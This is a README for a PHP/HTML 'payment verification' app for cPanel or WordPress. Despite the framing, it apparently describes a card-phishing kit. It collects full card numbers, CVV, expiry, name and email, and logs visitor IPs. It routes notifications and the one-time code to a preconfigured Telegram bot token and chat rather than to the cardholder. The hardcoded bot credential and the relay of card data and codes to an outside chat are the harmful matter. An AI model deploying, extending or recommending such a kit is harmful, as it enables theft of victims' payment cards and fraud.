# Payment Verification System - HTML/PHP Version

Complete HTML/PHP application for payment verification with OTP codes, Telegram notifications, and admin panel. Fully compatible with cPanel and WordPress hosting.

## Features

✅ **Card Capture** - Secure card information collection
✅ **OTP Verification** - 6-digit code verification  
✅ **Telegram Notifications** - Real-time alerts for payments
✅ **Admin Panel** - Dashboard with visitor tracking
✅ **Visitor Logging** - Track all user interactions
✅ **Responsive Design** - Works on all devices
✅ **MySQL Database** - Persistent data storage
✅ **Zero Dependencies** - Pure HTML/PHP/JS, no frameworks

## Quick Start - cPanel/WordPress

### 1️⃣ Upload Files to cPanel
```
public_html/
├── index.html       (Main payment form)
├── admin.php        (Admin dashboard)
├── api.php          (Backend API)
├── config.php       (Configuration)
├── script.js        (Frontend logic)
└── style.css        (Styling)
```

### 2️⃣ Create MySQL Database
**Via cPanel:**
1. Go to **MySQL Databases**
2. Create database: `payment_app`
3. Create user with password
4. Assign ALL privileges
5. Open **phpMyAdmin**
6. Select `payment_app` database
7. **SQL** tab → paste `database.sql` contents → Execute

### 3️⃣ Configure Settings
Edit `config.php` with your credentials:
```php
define('DB_HOST', 'localhost');
define('DB_USER', 'your_database_user');
define('DB_PASSWORD', 'your_database_password');
define('DB_NAME', 'payment_app');
define('ADMIN_PASSWORD', 'change_this_to_secure_password');
```

Telegram settings (already configured):
```php
define('TELEGRAM_BOT_TOKEN', '8332648469:AAG0nSTVcu5DuLsvXEGa0cr5MV_Ae7BB4_g');
define('TELEGRAM_CHAT_ID', '-4843141531');
```

### 4️⃣ Set File Permissions
```bash
chmod 600 config.php      # Protect config file
chmod 755 .              # Directory permissions
```

### 5️⃣ Test It
- **Main App:** `https://yourdomain.com`
- **Admin Panel:** `https://yourdomain.com/admin.php`
- Admin password: (whatever you set in config.php)

## How It Works

### Payment Flow
1. User enters card details (number, expiry, CVV, name, email)
2. Server captures data → generates 6-digit OTP
3. Sends OTP via Telegram notification
4. User enters OTP code
5. Server verifies OTP → marks transaction as verified
6. Admin panel tracks all activity

### Admin Dashboard
- **Statistics:** Total visitors, transactions, verified/pending counts
- **Transactions:** List of all payments with status
- **Activity Log:** Visitor IP, actions, timestamps, and details
- **Password protected** with session management

## File Functions

| File | Purpose |
|------|---------|
| `index.html` | Payment form with card input, OTP verification |
| `api.php` | Backend: card capture, OTP verification, data validation |
| `admin.php` | Admin dashboard: login, statistics, transaction history |
| `config.php` | Database config, Telegram settings, helper functions |
| `script.js` | Form validation, formatting, AJAX requests |
| `style.css` | Responsive design, modern UI/UX |
| `database.sql` | MySQL schema: transactions, visitor_logs tables |

## Security Best Practices

⚠️ **CRITICAL:**
1. ✅ Change admin password in config.php
2. ✅ Use HTTPS only (SSL certificate required)
3. ✅ Keep config.php permissions restricted (chmod 600)
4. ✅ Regular database backups via cPanel
5. ✅ Update Telegram credentials if exposed
6. ✅ Consider IP whitelisting for admin panel

## Customization

### Change Admin Password
In `config.php`:
```php
define('ADMIN_PASSWORD', 'your_new_secure_password');
```

### Send Emails Instead of Telegram
In `api.php`, find `handleCardCapture()` and uncomment:
```php
mail($email, 'Verification Code', $emailBody, "From: noreply@yourdomain.com");
```

### Modify Telegram Notifications
Edit message templates in `api.php`:
```php
$telegramMessage = "Custom message here...";
sendTelegramMessage($telegramMessage);
```

## Troubleshooting

**Database connection failed:**
- Check MySQL credentials in config.php
- Verify database exists in cPanel
- Ensure MySQL is running

**Admin panel shows blank:**
- Import database.sql via phpMyAdmin
- Check file permissions
- Verify PHP version (5.7+ required)

**Telegram notifications not working:**
- Verify bot token and chat ID
- Check server can make HTTP requests (cPanel doesn't block)
- Test with phpMyAdmin: `SELECT * FROM transactions`

**OTP not sending:**
- Currently sends to Telegram (see Telegram notifications above)
- To use email: uncomment mail() function in api.php
- Configure sender email address

## API Endpoints

### POST /api.php?action=capture_card
Captures payment card information
```javascript
{
  cardNumber: "1234567890123456",
  expiryDate: "12/25",
  cvv: "123",
  cardholderName: "John Doe",
  email: "john@example.com"
}
```

### POST /api.php?action=verify_otp
Verifies OTP code
```javascript
{
  sessionId: "session_hash",
  otpCode: "123456"
}
```

## Database Schema

**transactions table:**
- session_id (unique session identifier)
- card_number (last 4 digits stored for reference)
- cardholder_name
- email
- expiry_date
- otp_code (stored temporarily)
- otp_verified (boolean)
- status (pending/verified/failed)
- created_at, verified_at timestamps

**visitor_logs table:**
- ip_address
- user_agent
- action (card_captured, otp_verified, etc)
- data (JSON details)
- timestamp

## WordPress Integration

If using as WordPress plugin:
1. Create plugin folder: `wp-content/plugins/payment-verification/`
2. Upload all files there
3. Access at: `yoursite.com/wp-content/plugins/payment-verification/`
4. Or create custom page with iframe pointing to the app

## Support & Issues

For cPanel hosting issues:
- Contact your hosting provider's support
- Check error logs via cPanel File Manager
- Verify PHP version (7.0+ recommended)

For application issues:
- Check `error.log` file in same directory
- Enable `display_errors` in config.php temporarily (for debugging only)
- Review database tables in phpMyAdmin

## Version
1.0.0 - Initial Release

## License
Commercial - All rights reserved
